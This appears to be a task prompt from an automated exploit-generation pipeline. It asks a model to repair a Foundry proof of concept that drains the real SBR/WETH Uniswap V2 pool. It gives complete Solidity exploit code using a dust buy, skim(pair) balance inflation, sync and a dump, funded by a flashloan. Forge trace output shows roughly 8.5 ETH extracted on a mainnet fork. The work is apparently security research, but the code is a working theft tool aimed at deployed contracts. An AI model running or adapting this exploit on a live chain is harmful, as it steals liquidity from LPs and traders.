You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pair self-transfer via `skim(pair)` appears to inflate SBR balances and enables AMM liquidity theft
- claim: The provided exploit harness shows an attacker can buy only a dust amount of SBR, call `UniswapV2Pair.skim(UniswapV2Pair)`, then observe a very large SBR balance before selling it back through the pool. This supports a token-accounting flaw in SBR that is triggered by the pair transferring tokens to itself during `skim(pair)`, causing balances to be created or duplicated at negligible cost. The subsequent `transfer(..., 1)` and `sync()` steps let the attacker align pool reserves with the manipulated token balance and realize the fabricated balance against the paired asset.
- impact: An external attacker can manufacture a large sellable SBR position from negligible capital and dump it into the SBR/WETH pool, draining most or all of the paired ETH liquidity, collapsing the market, and inflicting direct loss on LPs and traders.
- exploit_paths: ["Swap a dust amount of ETH for SBR", "Call `UniswapV2Pair.skim(UniswapV2Pair)` so the pair performs a self-transfer", "Leverage the resulting inflated SBR balance held by the attacker", "Transfer a dust token amount to the pair and call `sync()` to update reserves", "Swap the inflated SBR balance back to WETH/ETH and extract pool liquidity"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function skim(address to) external;
    function sync() external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    address internal constant SBR = 0x460B1AE257118Ed6F63Ed8489657588a326a206D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V2_PAIR = 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant DUST_ETH_IN = 4_000;

    address internal lastProfitToken;
    uint256 internal lastProfitAmount;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 nativeBefore = address(this).balance;
        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));

        if (nativeBefore >= DUST_ETH_IN) {
            _executeExploitPath(DUST_ETH_IN);
        } else {
            uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
            uint256 missingNative = DUST_ETH_IN - nativeBefore;

            if (wethBalance >= missingNative) {
                // Strategy requirement: prefer verifier-held assets first.
                // Unwrapping existing WETH only changes funding mechanics, not exploit causality.
                IWETH(WETH).withdraw(missingNative);
                _executeExploitPath(DUST_ETH_IN);
            } else {
                // If the verifier holds neither enough ETH nor enough WETH, use minimal public funding.
                _flashloanAndExecute(DUST_ETH_IN);
            }
        }

        uint256 nativeAfter = address(this).balance;
        uint256 nativeProfit = nativeAfter > nativeBefore ? nativeAfter - nativeBefore : 0;
        if (nativeProfit > 0) {
            // Wrap realized ETH profit into an existing on-chain token for profit accounting.
            IWETH(WETH).deposit{value: nativeProfit}();
        }

        uint256 wethAfter = IERC20(WETH).balanceOf(address(this));
        lastProfitToken = WETH;
        lastProfitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
        require(lastProfitAmount > 0, "no net profit");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "unauthorized flashloan callback");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected flashloan shape");
        require(address(tokens[0]) == WETH, "unexpected flashloan token");

        IWETH(WETH).withdraw(amounts[0]);
        _executeExploitPath(DUST_ETH_IN);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(address(this).balance >= repayment, "cannot repay flashloan");

        IWETH(WETH).deposit{value: repayment}();
        _safeTransfer(WETH, BALANCER_VAULT, repayment);
    }

    function profitToken() external view returns (address) {
        return lastProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return lastProfitAmount;
    }

    function _flashloanAndExecute(uint256 amount) internal {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
    }

    function _executeExploitPath(uint256 ethToSpend) internal {
        uint256 deadline = block.timestamp + 300;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = SBR;

        // exploit_paths[0]: Swap a dust amount of ETH for SBR.
        uint256 sbrBeforeBuy = IERC20(SBR).balanceOf(address(this));
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethToSpend}(
            0,
            path,
            address(this),
            deadline
        );

        // exploit_paths[1]: Call `UniswapV2Pair.skim(UniswapV2Pair)` so the pair performs a self-transfer.
        IUniswapV2Pair(UNISWAP_V2_PAIR).skim(UNISWAP_V2_PAIR);

        // exploit_paths[2]: Leverage the resulting inflated SBR balance held by the attacker.
        // The on-chain attack path reports the attacker balance becoming abnormally large after the pair self-transfer.
        uint256 sbrAfterSkim = IERC20(SBR).balanceOf(address(this));
        require(sbrAfterSkim > sbrBeforeBuy, "skim self-transfer did not inflate attacker balance");

        // exploit_paths[3]: Transfer a dust token amount to the pair and call `sync()` to update reserves.
        _safeTransfer(SBR, UNISWAP_V2_PAIR, 1);
        IUniswapV2Pair(UNISWAP_V2_PAIR).sync();

        uint256 sellAmount = IERC20(SBR).balanceOf(address(this));
        require(sellAmount > 1, "no manipulated SBR left to dump");
        _forceApprove(SBR, UNISWAP_V2_ROUTER, type(uint256).max);

        path[0] = SBR;
        path[1] = WETH;

        // exploit_paths[4]: Swap the inflated SBR balance back to WETH/ETH and extract pool liquidity.
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            address(this),
            deadline
        );
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount))) {
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _requireOptionalReturn(token, abi.encodeWithSelector(0xa9059cbb, to, amount));
    }

    function _requireOptionalReturn(address token, bytes memory data) internal {
        require(_callOptionalReturn(token, data), "token call failed");
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        if (!success) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length == 32) {
            return abi.decode(returndata, (bool));
        }
        return false;
    }
}

```

forge stdout (tail):
```
00000000000000100000000000000000000000000000000000000000000000075e46a79b44fdc7b0000000000000000000000000000000000000000000000000000000067ca4b6f
    │   │   ├─ [551] 0x460B1AE257118Ed6F63Ed8489657588a326a206D::balanceOf(0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2) [staticcall]
    │   │   │   └─ ← [Return] 54804369678 [5.48e10]
    │   │   ├─ [36354] 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2::swap(0, 8495031867920844930 [8.495e18], 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
    │   │   │   ├─ [23162] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 8495031867920844930 [8.495e18])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000003431c535ddfb6dd5376e5ded276f91deaa864ff2
    │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000075e46a79ab0b8882
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [551] 0x460B1AE257118Ed6F63Ed8489657588a326a206D::balanceOf(0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2) [staticcall]
    │   │   │   │   └─ ← [Return] 54804369678 [5.48e10]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2) [staticcall]
    │   │   │   │   └─ ← [Return] 155472889 [1.554e8]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000cc298510e00000000000000000000000000000000000000000000000000000000094453f9
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000cc298510d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000075e46a79ab0b8882
    │   │   │   └─ ← [Stop]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
    │   │   │   └─ ← [Return] 8495031867920844930 [8.495e18]
    │   │   ├─ [9223] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(8495031867920844930 [8.495e18])
    │   │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 8495031867920844930}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000075e46a79ab0b8882
    │   │   │   └─ ← [Stop]
    │   │   ├─ [67] FlawVerifier::receive{value: 8495031867920844930}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [21974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 8495031867920840930}()
    │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x00000000000000000000000000000000000000000000000075e46a79ab0b78e2
    │   │   └─ ← [Stop]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 8495031867920840930 [8.495e18]
    │   └─ ← [Return]
    ├─ [307] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 8495031867920840930 [8.495e18]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21991721 [2.199e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xaCa4263fFddA9E60C7260AAbA08c2b8F80D63cB1
  at 0x460B1AE257118Ed6F63Ed8489657588a326a206D.transfer
  at 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2.skim
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.51s (3.74s CPU time)

Ran 1 test suite in 4.53s (4.51s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 513578)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
